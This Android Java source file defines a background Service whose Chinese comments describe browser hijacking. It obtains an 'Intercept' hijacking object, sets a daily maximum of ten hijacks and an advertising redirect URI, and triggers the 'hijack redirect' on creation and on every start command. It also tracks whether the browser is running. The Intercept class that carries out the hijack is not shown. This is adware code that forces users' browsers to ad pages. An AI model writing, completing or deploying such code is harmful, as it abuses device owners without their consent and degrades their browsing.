package com.tang.study.companytest1;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

/**
 * Created by Tangshuiming99 on 2016/4/26.
 */
public class MyService extends Service{
    /***/
    private Intercept intercept;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        //获取劫持类对象实例
        intercept = Intercept.getInstance(this);
        Log.e("Cat", "获取到Intercept实例：" + intercept);
        //第一次进入，记录浏览器是否启动 （默认false）
        intercept.changeStatus(false);
        //获取每天最大劫持次数和跳转广告Uri
        int maxTimes = 10;
        String uri = "http://www.baidu.com";
//        uri = uri.replace("$", ":");
        //劫持跳转
        intercept.doInter(maxTimes, uri);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //获取每天最大劫持次数和跳转广告Uri
        int maxTimes = 10;
        String uri = "http://www.baidu.com";
//        uri = uri.replace("$", ":");
        //劫持跳转
        intercept.doInter(maxTimes, uri);

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        //如果进程被杀掉或者挂掉
        if(intercept != null){
            intercept.changeStatus(false);
            intercept.killAction();
        }
    }
}
